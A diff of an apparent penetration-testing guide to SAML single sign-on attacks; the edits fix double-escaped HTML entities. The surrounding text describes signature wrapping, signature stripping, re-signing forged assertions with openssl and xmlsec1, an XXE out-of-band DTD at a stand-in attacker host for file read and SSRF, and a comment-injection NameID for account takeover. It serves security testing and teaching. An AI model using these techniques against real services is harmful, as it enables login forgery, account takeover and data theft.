@@ -58,7 +58,7 @@
 <li>A request or redirect carries a <code>SAMLRequest</code> or <code>SAMLResponse</code> parameter</li>
 <li>Base64 (plus DEFLATE for the redirect binding) decodes to XML containing</li>
 </ul>
-<p><code>&amp;lt;saml:Assertion&amp;gt;</code>, <code>&amp;lt;samlp:Response&amp;gt;</code>, or <code>&amp;lt;saml:Subject&amp;gt;</code></p>
+<p><code>&lt;saml:Assertion&gt;</code>, <code>&lt;samlp:Response&gt;</code>, or <code>&lt;saml:Subject&gt;</code></p>
 <ul>
 <li>The target exposes a <code>/saml/acs</code>, <code>/sso</code>, <code>/saml2/acs</code>, or <code>/Shibboleth.sso</code></li>
 </ul>
@@ -114,21 +114,21 @@ echo 'PHNhbWxwOl...' | base64 -d | xmllint --format -</code></pre></div>
 <p><strong>samltool.com</strong> (SAMLtool by OneLogin) decodes and re-encodes messages and is useful for understanding structure — but treat it as offline reference only. Never paste a live production assertion into a third-party website; decode with the commands above instead.</p>
 <p>Read these fields first, because they define every attack that follows:</p>
 <ul>
-<li><code>&amp;lt;ds:Signature&amp;gt;</code> — where it sits and what its <code>&amp;lt;ds:Reference URI="#..."&amp;gt;</code></li>
+<li><code>&lt;ds:Signature&gt;</code> — where it sits and what its <code>&lt;ds:Reference URI="#..."&gt;</code></li>
 </ul>
 <p>points to. This is the whole game.</p>
 <ul>
-<li><code>&amp;lt;saml:Subject&amp;gt;&amp;lt;saml:NameID&amp;gt;</code> — the identity being asserted</li>
-<li><code>&amp;lt;saml:AttributeStatement&amp;gt;</code> — roles, groups, email, entitlements</li>
-<li><code>&amp;lt;saml:Conditions&amp;gt;</code> — <code>NotBefore</code>, <code>NotOnOrAfter</code>, <code>AudienceRestriction</code></li>
-<li><code>&amp;lt;saml:SubjectConfirmationData&amp;gt;</code> — <code>Recipient</code>, <code>NotOnOrAfter</code>, <code>InResponseTo</code></li>
+<li><code>&lt;saml:Subject&gt;&lt;saml:NameID&gt;</code> — the identity being asserted</li>
+<li><code>&lt;saml:AttributeStatement&gt;</code> — roles, groups, email, entitlements</li>
+<li><code>&lt;saml:Conditions&gt;</code> — <code>NotBefore</code>, <code>NotOnOrAfter</code>, <code>AudienceRestriction</code></li>
+<li><code>&lt;saml:SubjectConfirmationData&gt;</code> — <code>Recipient</code>, <code>NotOnOrAfter</code>, <code>InResponseTo</code></li>
 <li><code>Destination</code> and <code>Issuer</code> on the response envelope</li>
 </ul>
 <h2 id="xml-signature-wrapping-xsw">XML Signature Wrapping (XSW)</h2>
 <p>The core SAML attack. The signature is cryptographically valid, but you move the signed element somewhere the signature checker still accepts it while the application logic reads a <em>different</em>, unsigned assertion that you control. The verifier and the consumer disagree about which element is authoritative.</p>
 <p>The eight canonical variants (Somorovsky et al.) differ in where the original signed assertion is relocated and where the forged one is injected:</p>
 <ul>
-<li><strong>XSW1 / XSW2</strong> — wrap the whole <code>&amp;lt;Response&amp;gt;</code>; the signature references the</li>
+<li><strong>XSW1 / XSW2</strong> — wrap the whole <code>&lt;Response&gt;</code>; the signature references the</li>
 </ul>
 <p>original response while a forged response is processed. XSW2 uses a non-enveloping signature position.</p>
 <ul>
@@ -142,7 +142,7 @@ echo 'PHNhbWxwOl...' | base64 -d | xmllint --format -</code></pre></div>
 <ul>
 <li><strong>XSW7 / XSW8</strong> — hide in a loose-schema wrapper. XSW7 puts the <em>forged</em></li>
 </ul>
-<p>assertion in an <code>&amp;lt;Extensions&amp;gt;</code> element; XSW8 buries the <em>original</em> signed one in an <code>&amp;lt;Object&amp;gt;</code> so it validates but is never consumed.</p>
+<p>assertion in an <code>&lt;Extensions&gt;</code> element; XSW8 buries the <em>original</em> signed one in an <code>&lt;Object&gt;</code> so it validates but is never consumed.</p>
 <div class="codeblk cx"><button class="copy" data-copy="# Attack in SAML Raider:
 #   1. Intercept the ACS POST, select the signed assertion
 #   2. Edit NameID / attributes in the assertion the app will read
@@ -156,7 +156,7 @@ echo 'PHNhbWxwOl...' | base64 -d | xmllint --format -</code></pre></div>
 <h2 id="unsigned-assertions-and-signature-stripping">Unsigned Assertions and Signature Stripping</h2>
 <p>Before the wrapping games, test the simplest failure: does the SP verify a signature at all?</p>
 <ul>
-<li><strong>Strip the signature.</strong> Remove <code>&amp;lt;ds:Signature&amp;gt;</code> entirely and forward. Some</li>
+<li><strong>Strip the signature.</strong> Remove <code>&lt;ds:Signature&gt;</code> entirely and forward. Some</li>
 </ul>
 <p>SPs only verify a signature <em>if one is present</em>.</p>
 <ul>
@@ -180,7 +180,7 @@ xmlsec1 --verify --pubkey-cert-pem idp.crt --id-attr:ID Assertion response.xml</
 </ul>
 <p>entitlement attributes the IdP never issued, change <code>email</code> to trigger account linking on the SP</p>
 <ul>
-<li><strong>AudienceRestriction</strong> — if the SP does not check <code>&amp;lt;Audience&amp;gt;</code>, an assertion</li>
+<li><strong>AudienceRestriction</strong> — if the SP does not check <code>&lt;Audience&gt;</code>, an assertion</li>
 </ul>
 <p>minted for <em>another</em> SP in the same federation is replayable here</p>
 <ul>
@@ -209,7 +209,7 @@ xmlsec1 --verify --pubkey-cert-pem idp.crt --id-attr:ID Assertion response.xml</
 &lt;samlp:Response ...&gt;...&amp;xxe;...&lt;/samlp:Response&gt;</code></pre></div>
 <p>Use an out-of-band DTD (<code>http://attacker/evil.dtd</code>) for blind file read and SSRF into the SP's internal network. The full technique — parameter entities, OOB exfiltration, error-based leakage — is in <a class="xref" href="exploiting-xxe.html"><code>exploiting-xxe</code></a>; the SAML angle is simply that the assertion is the injection point and the ACS is unauthenticated.</p>
 <h2 id="certificate-faking-and-self-signed-re-signing">Certificate Faking and Self-Signed Re-Signing</h2>
-<p>If the SP does not pin the IdP's certificate — instead trusting whatever cert is embedded in <code>&amp;lt;ds:KeyInfo&amp;gt;</code>, or accepting any cert from a broad CA bundle — you can strip the real signature, re-sign with your own key, and ship your cert in the message.</p>
+<p>If the SP does not pin the IdP's certificate — instead trusting whatever cert is embedded in <code>&lt;ds:KeyInfo&gt;</code>, or accepting any cert from a broad CA bundle — you can strip the real signature, re-sign with your own key, and ship your cert in the message.</p>
 <div class="codeblk cx"><button class="copy" data-copy="# Generate a key/cert and re-sign a tampered assertion
 openssl req -x509 -newkey rsa:2048 -keyout evil.key -out evil.crt -days 30 -nodes -subj &quot;/CN=idp&quot;
 xmlsec1 --sign --privkey-pem evil.key,evil.crt \
@@ -257,7 +257,7 @@ xmlsec1 --sign --privkey-pem tokensigning.key,tokensigning.crt \
 </ul>
 <p><code>AudienceRestriction</code>, <code>Recipient</code>, and <code>Destination</code>, assertions replay across SPs and tenants.</p>
 <ul>
-<li><em>"The comment thing is cosmetic."</em> <code>admin&amp;lt;!----&amp;gt;@evil.com</code> authenticates as</li>
+<li><em>"The comment thing is cosmetic."</em> <code>admin&lt;!----&gt;@evil.com</code> authenticates as</li>
 </ul>
 <p><code>admin</code>. Canonicalization mismatches are full account takeover.</p>
 <ul>
